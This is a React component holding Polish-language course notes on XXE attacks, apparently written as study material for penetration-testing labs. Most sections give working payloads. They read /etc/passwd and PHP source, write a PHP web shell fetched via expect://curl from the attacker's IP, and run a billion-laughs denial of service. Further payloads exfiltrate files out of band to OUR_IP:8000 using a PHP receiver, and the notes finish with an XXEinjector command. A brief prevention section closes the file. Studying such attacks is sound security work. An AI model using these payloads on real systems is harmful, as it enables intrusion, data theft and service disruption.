import { Link } from 'react-router-dom';
import xxe from '../../../assets/xxe.png';
import xxe_svg from '../../../assets/xxe_svg.png';
import xxe_identy from '../../../assets/xxe_identy.png';
import xxe_identy_2 from '../../../assets/xxe_identy_2.png';
import xxe_identy_3 from '../../../assets/xxe_identy_3.png';
import xxe_CDATA from '../../../assets/xxe_CDATA.png';
import xxe_out_of_band from '../../../assets/xxe_out_of_band.png';
import ExampleFrame from '../../exampleFrame/ExampleFrame';

const XXE = () => {

    return(
        <section>
            <h1>XXE (XML eXternal Entity)</h1>
            
            <details>
                <summary>XML eXternal Entity</summary>
                <p>W przypadku obrazów SVG możemy również uwzględnić złośliwe dane XML w celu wycieku kodu źródłowego aplikacji internetowej i innych dokumentów wewnętrznych na serwerze. Poniższy przykład można zastosować w przypadku obrazu SVG, z którego wycieka zawartość (/etc/passwd):</p>
                <div className='waring'>
                    <p>{`<?xml version="1.0" encoding="UTF-8"?>`}</p>
                    <p>{`<!DOCTYPE svg [ <!ENTITY`} <span className='error'>{`xxe`}</span> SYSTEM  <span className='important'>{`"file:///etc/passwd"`}</span>{`>`} ] {`>`}</p>
                    <p>{`<svg>`}<span className='error'>{`&xxe;`}</span> {`</svg>`}</p>
                </div>    
                
                <ExampleFrame screen={xxe} />

                <p>Po przesłaniu i wyświetleniu powyższego obrazu SVG dokument XML zostanie przetworzony i powinniśmy otrzymać informacje o (<span className='important'>/etc/passwd</span>) wydrukowane na stronie lub pokazane w źródle strony. Podobnie, jeśli aplikacja internetowa umożliwia przesyłanie dokumentów <span className='important'>XML</span>, wówczas ten sam ładunek może przeprowadzić ten sam atak, gdy dane XML zostaną wyświetlone w aplikacji internetowej. Aby użyć XXE do odczytu kodu źródłowego w aplikacjach internetowych PHP, możemy użyć następującego ładunku w naszym obrazie SVG:</p>
            
                <div className='waring'>
                    <p>{`<?xml version="1.0" encoding="UTF-8"?>`}</p>
                    <p>{`<!DOCTYPE svg [ <!ENTITY`} <span className='error'>{`xxe`}</span> SYSTEM  <span className='important'>{`"php://filter/convert.base64-encode/resource=index.php"`}</span>{`>`} ] {`>`}</p>
                    <p>{`<svg>`}<span className='error'>{`&xxe;`}</span> {`</svg>`}</p>
                </div>

                <ExampleFrame screen={xxe_svg} />

                <p>Po wyświetleniu obrazu SVG powinniśmy otrzymać zawartość pliku <span className='important'>index.php</span> zakodowaną w <span className='important'>base64</span>, którą możemy zdekodować w celu odczytania kodu źródłowego.</p>

                <p>Korzystanie z danych XML nie jest charakterystyczne dla obrazów SVG, ponieważ jest również wykorzystywane w wielu typach dokumentów, takich jak <span className='important'>PDF, dokumenty Word, dokumenty PowerPoint i wiele innych</span>. Wszystkie te dokumenty zawierają dane XML w celu określenia ich formatu i struktury. Załóżmy, że aplikacja internetowa korzysta z przeglądarki dokumentów podatnej na XXE i umożliwia przesyłanie dowolnego z tych dokumentów. W takim przypadku możemy również zmodyfikować ich dane XML, aby uwzględnić złośliwe elementy XXE, co umożliwi nam przeprowadzenie ślepego ataku XXE na wewnętrzny serwer WWW. Innym podobnym atakiem, który można również przeprowadzić za pomocą plików tego typu, jest atak SSRF. Możemy wykorzystać lukę XXE do wyliczenia wewnętrznie dostępnych usług, a nawet wywołać prywatne interfejsy API w celu wykonania prywatnych działań. Więcej informacji na temat SSRF można znaleźć w module Ataki po stronie serwera.</p>
            </details>


            <hr />

            <details>
                <summary>XML Document Type Definition (DTD)</summary>
                <p>Wstępnie zdefiniowaną strukturę dokumentu można zdefiniować w samym dokumencie lub w pliku zewnętrznym. Poniżej znajduje się przykładowy DTD dla dokumentu XML, który widzieliśmy wcześniej:</p>

                <div className='waring'>
                    <span className='important'>email.dtd</span>
                    <p>{`<!DOCTYPE email [`}</p>
                    <p className='tab-1'>{`<!ELEMENT email (date, time, sender, recipients, body)>`}</p>
                    <p className='tab-1'>{`<!ELEMENT recipients (to, cc?)>`}</p>
                    <p className='tab-1'>{`<!ELEMENT cc (to*)>`}</p>
                    <p className='tab-1'>{`<!ELEMENT date (#PCDATA)>`}</p>
                    <p className='tab-1'>{`<!ELEMENT time (#PCDATA)>`}</p>
                    <p className='tab-1'>{`<!ELEMENT sender (#PCDATA)>`}</p>
                    <p className='tab-1'>{`<!ELEMENT to  (#PCDATA)>`}</p>
                    <p className='tab-1'>{`<!ELEMENT body (#PCDATA)>`}</p>
                    <p className='tab-1'>{`  <!ELEMENT body (#PCDATA)>`}</p>
                    <p>{`]>`}</p>
                </div>

                <p>Jak widzimy, DTD deklaruje główny element e-mail za pomocą deklaracji typu <span className='important'>ELEMENT</span></p>

                <p>Powyższe DTD można umieścić w samym dokumencie XML, zaraz po <span className='important'>Deklaracji XML</span> w pierwszej linii. W przeciwnym razie można go zapisać w pliku zewnętrznym (np. <span className='important'>email.dtd</span>), a następnie odnieść się do niego w dokumencie XML za pomocą słowa kluczowego <span className='important'>SYSTEM</span> w następujący sposób:</p>

                <div className='waring'>
                    <p>{`<?xml version="1.0" encoding="UTF-8"?>`}</p>
                    <p>{`<!DOCTYPE email SYSTEM "`}<span className='important'>email.dtd</span>{`">`}</p>
                </div>

                <p>Możliwe jest również odwoływanie się do DTD poprzez adres URL w następujący sposób</p>

                <div className='waring'>
                    <p>{`<?xml version="1.0" encoding="UTF-8"?>`}</p>
                    <p>{`<!DOCTYPE email SYSTEM "`}<span className='important'>http://inlanefreight.com/email.dtd</span>{`">`}</p>
                </div>
            </details>

            <hr />

            <details>
                <summary>XML Entities</summary>
                <p>Możemy również zdefiniować zmienne XML w DTD XML. Można to zrobić za pomocą słowa kluczowego <span className='important'>ENTITY</span>, po którym następuje nazwa encji i jej wartość, w następujący sposób:</p>

                <p>Po zdefiniowaniu jednostki można się do niej odwoływać w dokumencie XML za pomocą nazwy <span className='error'>&company;</span> </p>
                <div className='waring'>
                    <p>{`<?xml version="1.0" encoding="UTF-8"?>`}</p>
                    <p>{`<!DOCTYPE email [`}</p>
                    <p className='tab-1'>{`<!ENTITY companyName SYSTEM "`}<span className='important'>Przykładowy tekst</span>{`">`}</p>
                    <p className='tab-1'>{`<!ENTITY company SYSTEM "`}<span className='important'>http://localhost/company.txt</span>{`">`}</p>
                    <p className='tab-1'>{`<!ENTITY signature SYSTEM "`}<span className='important'>file:///var/www/html/signature.txt</span>{`">`}</p>
                    <p>{`]>`}</p>
                </div>

                <div className='waring'>
                    <p>Uwaga: Możemy również użyć słowa kluczowego <span className='important'>PUBLIC</span> zamiast <span className='important'>SYSTEM</span> do ładowania zasobów zewnętrznych, które jest używane w przypadku publicznie zadeklarowanych jednostek i standardów</p>
                </div>

                <hr />

                <h2>Identyfikacja XXE</h2>
                <ExampleFrame screen={xxe_identy} />
                <p>Jeśli wypełnimy formularz kontaktowy i klikniemy Wyślij dane, a następnie przechwycimy żądanie HTTP za pomocą Burpa</p>
                <p>Widzimy, że na stronie wyświetlana jest nam wartość elementu <span className='important'>email</span></p>

                <div className='waring'>
                    <p>{`<!DOCTYPE email [`}</p>
                    <p className='tab-1'>{`<!ENTITY company "Inlane Freight">`}</p>
                    <p>{`]>`}</p>
                </div>

                <ExampleFrame screen={xxe_identy_2} />

                <p>Uwaga: W naszym przykładzie dane wejściowe XML w żądaniu HTTP nie miały żadnego DTD zadeklarowanego w samych danych XML ani nie było do niego odniesienia zewnętrznego, więc dodaliśmy nowy DTD przed zdefiniowaniem naszej jednostki. Jeżeli <span className='important'>DOCTYPE</span> został już zadeklarowany w żądaniu XML, po prostu dodalibyśmy do niego element <span className='important'>ENTITY</span>.</p>

                <div className='waring'>
                    <p>Uwaga: niektóre aplikacje internetowe mogą domyślnie używać formatu <span className='important'>JSON</span> w żądaniu HTTP, ale nadal mogą akceptować inne formaty, w tym XML. Zatem nawet jeśli aplikacja internetowa wysyła żądania w formacie JSON, możemy spróbować zmienić nagłówek <span className='important'>Content-Type na application/xml</span>, a następnie <span className='important'>przekonwertować dane JSON na XML</span> za <Link to='https://www.convertjson.com/json-to-xml.htm'>pomocą narzędzia online</Link>. Jeśli aplikacja internetowa zaakceptuje żądanie z danymi XML, możemy je również przetestować pod kątem luk XXE, które mogą ujawnić nieprzewidzianą lukę XXE.</p>
                </div>
                <ExampleFrame screen={xxe_identy_3} />

                <p>Widzimy, że rzeczywiście otrzymaliśmy zawartość pliku <span className='important'>/etc/passwd</span>, co oznacza, że <span className='important'>​​pomyślnie wykorzystaliśmy lukę XXE do odczytu plików lokalnych</span>.</p>
            </details>

            <hr />

            <details>
                <summary>Zdalne wykonanie kodu za pomocą XXE</summary>
                <div className='waring'>
                    <p>echo {"<?php system(`$_REQUEST['cmd']`); ?>"} > shell.php</p>
                    
                    <p>{`sudo python3 -m http.server 80`}</p>
                </div>

                <p>Następnie za pomocą <span className='important'>expect oraz curl</span> </p>

                <div className='waring'>
                    <p>{`<?xml version="1.0"?>`}</p>
                    <p>{`<!DOCTYPE email [`}</p>
                    <p className='tab-1'>{`<!ENTITY`} <span className='important'>company</span> {`SYSTEM "`}<span className='important'>{`expect://curl$IFS-O$IFS'`}</span><span className='error'>{`<NASZE IP>`}</span>{`/shell.php'">`}</p>
                    <p>{`]>`}</p>
                    <p>{`<root>`}</p>
                    <p>{`<name></name>`}</p>
                    <p>{`<tel></tel>`}</p>
                    <p>{`<email>`}<span className='important'>&company;</span>{`</email>`}</p>
                    <p>{`<message></message>`}</p>
                    <p>{`</root>`}</p>
                </div>  

                <div className='waring'>
                    <p>Uwaga: aby uniknąć złamania składni XML, zastąpiliśmy wszystkie spacje w powyższym kodzie XML przez $IFS. Ponadto wiele innych znaków, takich jak <span className='important'>{`|, > i {, może uszkodzić kod`}</span>, dlatego powinniśmy unikać ich używania.</p>
                </div>

                <div className='waring'>
                    <p>Uwaga: moduł oczekiwań nie jest domyślnie włączony/zainstalowany na nowoczesnych serwerach PHP, więc ten atak może nie zawsze działać. Dlatego właśnie XXE jest zwykle używany do ujawniania wrażliwych plików lokalnych i kodu źródłowego, co może ujawnić dodatkowe luki w zabezpieczeniach lub sposoby uzyskania wykonania kodu.</p>
                </div>
            </details>

            <hr />

            <details>
                <summary>DOS XXE</summary>
                <div className='waring'>
                    <p>{`<?xml version="1.0"?>`}</p>
                    <p>{`<!DOCTYPE email [`}</p>
                        <p className='tab-1'>{`  <!ENTITY a0 "DOS" >`}</p>
                        <p className='tab-1'>{`  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">`}</p>
                        <p className='tab-1'>{`  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">`}</p>
                        <p className='tab-1'>{`  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">`}</p>
                        <p className='tab-1'>{`  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">`}</p>
                        <p className='tab-1'>{` <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">`}</p>
                        <p className='tab-1'>{`  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">`}</p>
                        <p className='tab-1'>{`  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">`}</p>
                        <p className='tab-1'>{` <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">`}</p>
                        <p className='tab-1'>{`<!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">`}</p>
                        <p className='tab-1'>{` <!ENTITY `}<span className='important'>a10</span>{`"&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">     `}</p>
                    <p>{`]>`}</p>
                    <p>{`<root>`}</p>
                    <p>{`<name></name>`}</p>
                    <p>{`<tel></tel>`}</p>
                    <p>{`<email>`}<span className='important'>&a10;</span>{`</email>`}</p>
                    <p>{`<message></message>`}</p>
                    <p>{`</root>`}</p>
                </div>  

                <div className='waring'>
                    <p>Ten ładunek definiuje jednostkę <span className='important'>a0</span> jako <span className='important'>DOS</span>, odwołuje się do niej wielokrotnie w <span className='important'>a1</span>, odwołuje się do <span className='important'>a1 w a2</span> i tak dalej, aż do wyczerpania się pamięci serwera zaplecza z powodu pętli samoodniesień. <span className='important'>Jednak ten atak nie działa już na nowoczesnych serwerach internetowych (np. Apache), ponieważ chronią one przed odniesieniem się do siebie jednostki</span>. Wypróbuj to w porównaniu z tym ćwiczeniem i zobacz, czy zadziała.</p>
                </div>
            </details>

            <hr />

            <details>
                <summary>Zaawansowana eksfiltracja za pomocą CDATA</summary>
                <p>Możemy wykorzystać inną metodę do wyodrębnienia dowolnego rodzaju danych (w tym danych binarnych) dla dowolnego zaplecza aplikacji internetowej. Aby wyprowadzić dane niezgodne z formatem XML, możemy opakować zawartość odnośnika do pliku zewnętrznego znacznikiem <span className='important'>CDATA</span> (np. <span className='important'>{`<![CDATA[ FILE_CONTENT ]]>`}</span>). W ten sposób parser XML potraktuje tę część jako <span className='important'>surowe dane</span>, które mogą zawierać dowolny typ danych, łącznie ze znakami specjalnymi.</p>
            
                <div className='waring'>
                    <p>{`<!DOCTYPE email [`}</p>
                    <p className='tab-1'>{`<!ENTITY  `}<span className='error'>begin</span><span className='important'>{` "<![CDATA["`}</span>{`>`}</p>
                    <p className='tab-1'>{` <!ENTITY   `}<span className='error'>file </span>"SYSTEM <span className='important'>{`file:///var/www/html/submitDetails.php`}</span>{`">`}</p>
                    <p className='tab-1'>{`<!ENTITY `}<span className='error'>end</span> "]]>"></p>
                    <p className='tab-1'>{`<!ENTITY `}<span className='error'>joined </span>"&<span className='important'>{`begin`}</span>;&<span className='important'>{`file`}</span>;&<span className='important'>end</span>;"{`>`}</p>
                    <p >{`]>`}</p>
                </div>

                <p>Następnie, jeśli odwołamy się do <span className='important'>&joined;</span> podmiot, powinien zawierać nasze dane ucieczki. <span className='important'>Jednak to nie zadziała, ponieważ XML uniemożliwia łączenie podmiotów wewnętrznych i zewnętrznych</span>, więc będziemy musieli znaleźć lepszy sposób, aby to zrobić. Aby ominąć to ograniczenie, możemy wykorzystać <span className='important'>encje parametrów XML</span>, specjalny typ encji rozpoczynający się od znaku <span className='important'>%</span> i mogący być używany tylko w DTD.</p>
            
                <p className='error'>{`<!ENTITY joined "%begin;%file;%end;">`}</p>

                <h3>WIĘC !!!</h3>
                
                <div className='waring'>
                    <p>echo <span className='important'>{`'<!ENTITY joined "%begin;%file;%end;">'`}</span> {`>`} xxe.dtd</p>
                    <p>python3 -m http.server 8000</p>
                </div>

                <div className='waring'>
                    <p>{`<!DOCTYPE email [`}</p>
                    <p className='tab-1'>{`<!ENTITY  `}<span className='error'>begin</span><span className='important'>{` "<![CDATA["`}</span>{`>`}<span className='tab-2'>{`<!-- dodaj początek znacznika CDATA -->`}</span></p>
                    <p className='tab-1'>{` <!ENTITY   `}<span className='error'>file </span>"SYSTEM <span className='important'>{`file:///var/www/html/submitDetails.php`}</span>{`">`}<span className='tab-2'>{`<!-- odwołaj się do pliku zewnętrznego -->`}</span></p>
                    <p className='tab-1'>{`<!ENTITY `}<span className='error'>end</span> "]]>"><span className='tab-2'>{`<!-- dołącz koniec znacznika CDATA -->`}</span></p>
                    <p className='tab-1'><span className='important'>{`<!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">`}</span><span className='tab-2'>{`<!-- odwołaj się do naszego zewnętrznego DTD -->`}</span></p>
                    <p className='tab-1'><span className='important'>%xxe;</span></p>
                    <p >{`]>`}</p>
                </div>

                <ExampleFrame screen={xxe_CDATA} />

                <div className='waring'>
                    <p>Uwaga: na niektórych nowoczesnych serwerach internetowych możemy nie być w stanie odczytać niektórych plików (takich jak indeks.php), ponieważ serwer WWW zapobiegałby atakowi DOS spowodowanemu przez samoodniesienie do pliku/elementu (tj. pętlę odniesień do encji XML) , jak wspomniano w poprzedniej sekcji.</p>
                </div>

                <p>Ta sztuczka może okazać się bardzo przydatna, gdy podstawowa metoda XXE nie działa lub gdy mamy do czynienia z innymi frameworkami do tworzenia stron internetowych. </p>
            </details>



            <hr />

            <details>
                <summary>XXE na podstawie błędu</summary>
                <p>Niektóre formaty plików mogą nie być czytelne za pomocą podstawowego XXE, podczas gdy w innych przypadkach aplikacja internetowa może w niektórych przypadkach nie wyświetlać żadnych wartości wejściowych, więc możemy próbować <span className='important'>wymusić to przez błędy</span>.</p>

                <p>Najpierw spróbujmy<span className='important'> wysłać zniekształcone dane XML</span> i zobaczmy, czy aplikacja internetowa wyświetla jakieś błędy. W tym celu możemy usunąć dowolny ze znaczników zamykających, zmienić jeden z nich tak, aby się nie zamykał (np. <span className='important'>{`<roo>`}</span> zamiast <span className='important'>{`<root>`}</span>) lub po prostu odwołać się do nieistniejącego bytu.<span className='important'>(&nonExistingEntity;)</span></p>

                <div className='waring'>
                    <p>{`<!ENTITY %`}<span className='error'> file</span>  SYSTEM "<span className='important'>file:///etc/hosts</span>{`">`}</p>
                    <p>{`<!ENTITY % `}<span className='error'>error</span>{`"<!ENTITY `}<span className='error'>content </span>SYSTEM  '<span className='important'>%nonExistingEntity;/%file;</span>{`'>">`}</p>
                    <span className='important'>Niżej wykorzystane jako plik xxe.dtd</span>
                </div>

                <div className='waring'>
                    <p>{`<!DOCTYPE email [ `}</p>
                    <p className='tab-1'>{`<!ENTITY % remote SYSTEM "http://`}<span className='important'>{`<NASZE IP:PORT>`}</span>/xxe.dtd</p>
                    <p className='tab-1'><span className='error'>%remote;</span></p>
                    <p className='tab-1'><span className='error'>%error;</span></p>
                    <p>{`]>`}</p>
                </div>
            </details>


            <hr />

            <details>
                <summary>Eksfiltracja danych poza pasmem (Out-of-band)</summary>
                <p>Aby to zrobić, możemy najpierw użyć encji parametrycznej dla zawartości pliku, który czytamy, jednocześnie wykorzystując filtr PHP do kodowania base64. Następnie utworzymy kolejną jednostkę parametru zewnętrznego i odniesiemy ją do naszego adresu IP oraz umieścimy wartość parametru pliku jako część adresu URL żądanego przez HTTP w następujący sposób:</p>

                <div className='waring'>
                    <p>{`<!ENTITY  `}<span className='error'>% file</span> SYSTEM <span className='important'>"php://filter/convert.base64-encode/resource=/etc/passwd"</span>{`>`}</p>
                    <p>{`<!ENTITY `}<span className='error'>% oob</span>{` "<!ENTITY `}<span className='error'>content </span>SYSTEM <span className='important'>'http://OUR_IP:8000/?content=%file;'</span>{`>">`}</p>
                </div>

                <p>Jeżeli np. plik, który chcemy odczytać miał zawartość <span className='important'>XXE_SAMPLE_DATA</span>, to parametr pliku zawierałby jego dane zakodowane w formacie <span className='important'>base64 (WFhFX1NBTVBMRV9EQVRB)</span>. Gdy plik XML spróbuje odwołać się do zewnętrznego parametru oob z naszej maszyny, wyświetli żądanie <span className='important'>http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB</span>. Na koniec możemy zdekodować ciąg WFhFX1NBTVBMRV9EQVRB, aby uzyskać zawartość pliku. Możemy nawet napisać prosty skrypt PHP, który automatycznie wykryje zakodowaną zawartość pliku, zdekoduje ją i wyśle ​​do terminala:</p>

                <div className='waring'>
                    <p>{`<?php`}</p>
                    <p>{`if(isset($_GET['content'])){`}</p>
                    <p className='tab-1'>{`error_log("`}\n\n" {`. base64_decode($_GET['content']));`}</p>
                    <p>{`}`}</p>
                    <p>{`?>`}</p>
                    <p className='important'>Zapisujemy w pliku index.php</p>
                </div>

                <p className='important'>php -S 0.0.0.0:8000</p>
                
                <p>Teraz, aby zainicjować nasz atak, możemy użyć ładunku podobnego do tego, którego użyliśmy w ataku opartym na błędach, i po prostu dodać <span className='important'>{`<root>&content;</root>`}</span>, który jest potrzebny do odniesienia się do naszej jednostki i wysłania przez nią żądanie do naszej maszyny z zawartością pliku:</p>

                <div className='waring'>
                    <p>{`<?xml version="1.0" encoding="UTF-8"?>`}</p>
                    <p>{`<!DOCTYPE email [ `}</p>
                    <p className='tab-1'>{`<!ENTITY % remote SYSTEM "`}<span className='important'>http://OUR_IP:8000/xxe.dtd</span>{`">`}</p>
                    <p className='tab-1'>{`%remote;`}</p>
                    <p className='tab-1'>{`%oob;`}</p>
                    <p>{`]>`}</p>
                    <p>{`<root>&content;</root>`}</p>
                </div>

                <ExampleFrame screen={xxe_out_of_band} />

                <div className='waring'>
                    <p>Wskazówka: Oprócz przechowywania naszych danych zakodowanych w formacie <span className='important'>Base64</span> jako parametru naszego adresu URL, możemy skorzystać z <span className='important'>eksfiltracji DNS OOB</span>, umieszczając zakodowane dane jako subdomenę dla naszego adresu URL (np. <span className='important'>ENCODEDTEXT.our.website.com</span>), a następnie użyć narzędzie takie jak <span className='important'>tcpdump</span> do przechwytywania całego ruchu przychodzącego i dekodowania ciągu subdomeny w celu uzyskania danych. To prawda, że ​​ta metoda jest bardziej zaawansowana i wymaga więcej wysiłku, aby wydobyć dane.</p>
                </div>
            </details>

            <hr />
           
            <details>
                <summary>XXE w SVG</summary>
                <div className='waring'>
                    <p>{`<?xml version="1.0" standalone="yes"?>`}<span className='important'>{`<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>`}</span>{`<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">`}<span className='important'>{`<text font-size="16" x="0" y="16">&xxe;</text>`}</span>{`</svg>`}</p>
                </div>
            </details>

            <hr />
           
            <details>
                <summary>XInclude XXE</summary>
                <p>Przykładem tego jest sytuacja, gdy dane przesłane przez klienta zostają umieszczone w żądaniu SOAP zaplecza, które następnie jest przetwarzane przez usługę SOAP zaplecza.</p>
                <p>W tej sytuacji nie można przeprowadzić klasycznego ataku XXE, ponieważ nie masz kontroli nad całym dokumentem XML i nie możesz zdefiniować ani zmodyfikować elementu DOCTYPE. Zamiast tego możesz jednak użyć XInclude.</p>
                <div className='waring'>
                    <p>{`<foo xmlns:xi="http://www.w3.org/2001/XInclude">`}</p>
                    <p>{`<xi:include parse="text" `}<span className='important'>href="file:///etc/passwd"/</span>{`></foo>`}</p>
                </div>
            </details>

            <hr />
           
            <details>
                <summary>Modyfikowanie content type</summary>
                <div className='waring'>
                    <p>POST /action HTTP/1.0</p>
                    <p>Content-Type: <span className='important'>application/x-www-form-urlencoded</span></p>
                    <p>Content-Length: 7</p>
                    <br />
                    <p>foo=bar</p>
                </div>
                <div className='waring'>
                    <p>POST /action HTTP/1.0</p>
                    <p>Content-Type: <span className='important'>text/xml</span></p>
                    <p>Content-Length: 7</p>
                    <br />
                    <p>{`<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>`}</p>
                </div>
            </details>

            <hr />
           
            <details>
                <summary>Automatyczne wykrywane OOB</summary>
                <Link to='https://github.com/FilipowiczP/XXEinjector'>XXEinjector</Link>

                <p>Kiedy już mamy narzędzie, możemy <span className='important'>skopiować żądanie HTTP z Burpa i zapisać je w pliku</span>, aby narzędzie mogło z niego skorzystać. Nie powinniśmy podawać pełnych danych XML, <span className='important'>tylko pierwszą linię, a po niej wpisać XXEINJECT</span> jako lokalizator pozycji narzędzia:</p>

                <div className='waring'>
                    <p>POST /blind/submitDetails.php HTTP/1.1</p>
                    <p>Host: 10.129.201.94</p>
                    <p>Content-Length: 169</p>
                    <p>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)</p>
                    <p>Content-Type: text/plain;charset=UTF-8</p>
                    <p>Accept: */*</p>
                    <p>Origin: http://10.129.201.94</p>
                    <p>Referer: http://10.129.201.94/blind/</p>
                    <p>Accept-Encoding: gzip, deflate</p>
                    <p>Accept-Language: en-US,en;q=0.9</p>
                    <p>Connection: close</p>
                    <p></p>
                    <p>{`<?xml version="1.0" encoding="UTF-8"?>`}</p>
                    <p><span className='important'>XXEINJECT</span></p>
                </div>

                <div className='waring'>
                    <p>ruby XXEinjector.rb --host=<span className='important'>[tun0 IP]</span> --httpport=<span className='important'>8000</span> --file=<span className='important'>/tmp/xxe.req</span> --path=<span className='important'>/etc/passwd</span> --oob=<span className='important'>http</span> --phpfilter</p>
                </div>

                <p>Wynik otrzymujemy w logach <span className='important'>cat Logs/10.129.201.94/etc/passwd.log </span></p>
            </details>

            <hr />

            <details>
                <summary className='defense'>Zapobieganie XXE</summary>
                <h3 className='defense'>Unikanie przestarzałych komponentów</h3>

                <p>Dzieje się tak dlatego, że twórcy stron internetowych zwykle nie obsługują danych wejściowych XML ręcznie, lecz za pomocą wbudowanych bibliotek XML. Jeśli więc aplikacja internetowa jest podatna na ataki XXE, najprawdopodobniej jest to spowodowane nieaktualną biblioteką XML, która analizuje dane XML.</p>
                <p>Na przykład funkcja <span className='defense'>libxml_disable_entity_loader w PHP</span> jest przestarzała, ponieważ pozwala programiście na włączanie jednostek zewnętrznych w niebezpieczny sposób, co prowadzi do luk XXE. Jeśli odwiedzimy dokumentację PHP dotyczącą tej funkcji, zobaczymy następujące ostrzeżenie:</p>
                <p className='defense'>Ta funkcja została WYCOFANA w PHP 8.0.0. Zdecydowanie odradza się poleganie na tej funkcji.</p>

                <p>Oprócz bibliotek również wszelkie <span className='defense'>procesory dokumentów lub plików</span>, które mogą wykonywać parsowanie XML, takie jak procesory obrazu SVG lub procesory dokumentów PDF</p>

                <h2 className='defense'>Korzystanie z bezpiecznych konfiguracji XML</h2>
                <ul>
                    <li>Wyłącz odwoływanie się do <span className='defense'>niestandardowych definicji typów dokumentów (DTD)</span></li>
                    <li>Możliwe jest odwoływanie się do <span className='defense'>zewnętrznych jednostek XML (External XML Entities)</span></li>
                    <li>Wyłącz <span className='defense'>przetwarzanie jednostki parametru (Parameter Entity processing)</span></li>
                    <li>Wyłącz obsługę <span className='defense'>XInclude</span></li>
                    <li>Zapobiegaj <span className='defense'>pętlom odwołań do jednostek (Entity Reference Loops)</span></li>
                </ul>

                <p>Powinniśmy zawsze mieć odpowiednią <span className='defense'>obsługę wyjątków w naszych aplikacjach internetowych</span> i zawsze powinniśmy <span className='defense'>wyłączać wyświetlanie błędów</span> wykonawczych na serwerach internetowych.</p>
                <p>Obejmuje to również <span className='defense'>unikanie standardów API</span> opartych na XML (np. <span className='defense'>SOAP</span>) i używanie zamiast nich interfejsów API opartych na <span className='defense'>JSON</span> (np. <span className='defense'>REST</span>).</p>
            
            </details>
        </section>
    )
};

export default XXE; 